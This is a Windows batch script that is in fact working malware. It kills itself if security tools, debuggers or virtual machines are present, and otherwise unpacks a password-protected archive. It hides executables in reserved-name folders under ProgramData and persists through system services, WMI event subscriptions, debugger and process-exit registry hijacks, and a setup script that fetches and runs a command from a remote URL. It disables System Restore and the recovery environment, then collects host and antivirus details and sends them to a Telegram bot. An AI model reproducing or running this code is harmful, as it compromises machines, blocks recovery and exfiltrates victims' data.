setlocal EnableDelayedExpansion

if exist "%ProgramData%\AUX..\Input.exe" (
    rd /s /q "%ProgramData%\dist"
    del /f "%~f0"
    exit /b
)

set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe SandboxieRpcSs.exe SandboxieDcomLaunch.exe httpdebuggerui.exe wireshark.exe fiddler.exe vboxservice.exe df5serv.exe vboxtray.exe vmtoolsd.exe vmwaretray.exe ida64.exe ollydbg.exe pestudio.exe vmwareuser.exe vgauthservice.exe vmacthlp.exe vmsrvc.exe x32dbg.exe x64dbg.exe x96dbg.exe vmusrvc.exe prl_cc.exe prl_tools.exe qemu-ga.exe joeboxcontrol.exe ksdumperclient.exe xenservice.exe joeboxserver.exe devenv.exe immunitydebugger.exe windbg.exe 32dbg.exe 64dbg.exe protection_id.exe scylla_x86.exe scylla_x64.exe scylla.exe idau64.exe idaq64.exe"

for %a in (%processList%) do (
    tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL
    if not errorlevel 1 (
        rd /s /q "%ProgramData%\dist"
        del /f "%~f0"
        exit /b
    )
)

"%ProgramData%\dist\UnRAR.exe" x -y -p147852369 "%ProgramData%\dist\51654.rar" "%ProgramData%\dist\"
mkdir \\.\%ProgramData%\NUL..\
mkdir \\.\%ProgramData%\AUX..\
mkdir \\.\%ProgramData%\CON..\
mkdir %WINDIR%\Setup\Scripts
fsutil file setshortname C:\ProgramData\NUL..\ ""
fsutil file setshortname C:\ProgramData\AUX..\ ""
fsutil file setshortname C:\ProgramData\CON..\ ""

move /Y "%ProgramData%\dist\Icon.dll" "\\.\%ProgramData%\AUX..\"
copy /Y "%ProgramData%\dist\Input.exe" "\\.\%ProgramData%\AUX..\"
move /Y "%ProgramData%\dist\Kape.dll" "\\.\%ProgramData%\CON..\"
move /Y "%ProgramData%\dist\Input.exe" "\\.\%ProgramData%\CON..\"
move /Y "%ProgramData%\dist\libssl-1_1.dll" "\\.\%ProgramData%\NUL..\"
move /Y "%ProgramData%\dist\vcruntime140.dll" "\\.\%ProgramData%\NUL..\"
move /Y "%ProgramData%\dist\libcrypto-1_1.dll" "\\.\%ProgramData%\NUL..\"
move /Y "%ProgramData%\dist\ShellExperienceHost.exe" "\\.\%ProgramData%\NUL..\"

echo @echo off >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
echo powershell.exe -C "$c = (iwr 'https://raw.githubusercontent.com/githab0/0/0/0/configr' -UseBasicParsing).Content.Trim(); $exe, $args = $c -split ' ', 2; ([WMIClass]'Win32_Process').Create($exe + ' ' + $args)" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
echo @echo off > "%USERPROFILE%\Cookies\ini.cmd"
echo powershell.exe %ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll >> "%USERPROFILE%\Cookies\ini.cmd"
echo @echo off > "%USERPROFILE%\Cookies\init.cmd"
echo powershell.exe %ProgramData%\CON..\Input.exe %ProgramData%\CON..\Kape.dll >> "%USERPROFILE%\Cookies\init.cmd"

sc config Fax binPath="%ProgramData%\CON..\Input.exe %ProgramData%\CON..\Kape.dll" start="auto" obj="LocalSystem"
sc create Update binPath="%ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll" start="auto" obj="LocalSystem"

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\start.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\init.cmd" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\ini.cmd" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f

wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="SCM", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="SCM", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start setup.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SCM\"", Consumer="CommandLineEventConsumer.Name=\"SCM\""

wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Event", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Event", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start install.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Event\"", Consumer="CommandLineEventConsumer.Name=\"Event\""

wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Consumer", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 240 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Consumer", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start start.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Consumer\"", Consumer="CommandLineEventConsumer.Name=\"Consumer\""

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start start.exe" /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v MonitorProcess /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start install.exe" /f /reg:64

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
reagentc /disable
rd /s /q "%ProgramData%\dist"

setlocal EnableDelayedExpansion
set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
set "CHAT_ID=5674938532"

for /f "tokens=1,* delims=|" %a in ('
  powershell -NoProfile -Command ^
    "$json = Invoke-RestMethod -Uri 'http://ip-api.com/json/';" ^
    "Write-Host ($json.query + '|' + $json.country)"
') do (
    set "IP=%a"
    set "Country=%b"
)

for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_OperatingSystem).Caption"') do (
    set "Windows=%a"
)

for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_Processor).Name"') do (
    set "CPU=%a"
)

for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_VideoController).Caption"') do (
    set "GPU=%a"
)

for /f "tokens=*" %a in ('powershell -NoProfile -Command "[System.Environment]::Is64BitOperatingSystem"') do (
    if %a==True (
        set "Arch=X64"
    ) else (
        set "Arch=X86"
    )
)

for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct).displayName"') do (
    if defined Antivirus (
        set "Antivirus=!Antivirus!,%a"
    ) else (
        set "Antivirus=%a"
    )
)

set "UserName=%USERNAME%"
set "Worker=%COMPUTERNAME%"

powershell -NoProfile -Command ^
  "$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%';" ^
  "Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
endlocal
